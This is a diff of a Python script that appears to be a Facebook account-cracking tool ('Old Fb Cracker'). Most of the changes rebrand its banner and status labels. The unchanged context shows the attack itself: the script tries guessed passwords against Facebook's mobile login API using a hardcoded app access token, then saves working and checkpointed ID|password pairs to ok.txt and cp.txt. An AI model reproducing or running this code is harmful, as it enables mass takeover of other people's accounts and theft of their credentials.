@@ -57,7 +57,7 @@ class Main:
 		
 		print ("""\033[1;92m 
   
-   /$$$$$$$  /$$                     /$$                      
+ /$$$$$$$  /$$                     /$$                      
 | $$__  $$| $$                    | $$                      
 | $$  \ $$| $$  /$$$$$$   /$$$$$$$| $$   /$$                
 | $$$$$$$ | $$ |____  $$ /$$_____/| $$  /$$/                
@@ -65,9 +65,7 @@ class Main:
 | $$  \ $$| $$ /$$__  $$| $$      | $$_  $$                 
 | $$$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$ \  $$                
 |_______/ |__/ \_______/ \_______/|__/  \__/                
-                                                            
-                                                            
-                                                            
+                                                                                                                                
  /$$   /$$                       /$$                        
 | $$  | $$                      | $$                        
 | $$  | $$ /$$   /$$ /$$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$ 
@@ -76,9 +74,7 @@ class Main:
 | $$  | $$| $$  | $$| $$  | $$  | $$ /$$| $$_____/| $$      
 | $$  | $$|  $$$$$$/| $$  | $$  |  $$$$/|  $$$$$$$| $$      
 |__/  |__/ \______/ |__/  |__/   \___/   \_______/|__/      
-                                                            
-                                                            
-                                                            
+                                                                                                                                
  /$$$$$$$$                                                  
 |__  $$__/                                                  
    | $$  /$$$$$$   /$$$$$$  /$$$$$$/$$$$                    
@@ -87,19 +83,9 @@ class Main:
    | $$| $$_____/ /$$__  $$| $$ | $$ | $$                   
    | $$|  $$$$$$$|  $$$$$$$| $$ | $$ | $$                   
    |__/ \_______/ \_______/|__/ |__/ |__/                   
-                                                            
-                                                            
-                                                            
-                                        
-                 
-                
-                 
-                 
-                                
-                 
-             ....... BD JAHIED ......
-                                          
- 
+                                                                                                                                                    
+                         ....☢️BD JAHIED☢️....
+                           
 \033[1;90m══════════════════════════════════════════════════
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : BD JAHIED 
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : BLACK HUNTER TEAM 
@@ -110,7 +96,7 @@ class Main:
 		print("%s [%s•%s] %sTOOL NAME : %sOld Fb Cracker"%(G,R,G,B,G))
 		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
 		print("")
-		print("\n    \033[0;92m            UID☣️CLONING☣️ \033[0;97m ")
+		print("\n    \033[0;92m            B.H.T☢️UID☣️CLONING☣️ \033[0;97m ")
 		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-13 {JUST NOW} %s(FREE)"%(G,R,G,Y,B))
 		tanya = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
 		if tanya in ["", " "]:
@@ -167,12 +153,12 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r  \033[0;92m   [Snigdho-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;92m   [JAHIED-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [Snigdho-CP] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[0;91m   [JAHIED-CP] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
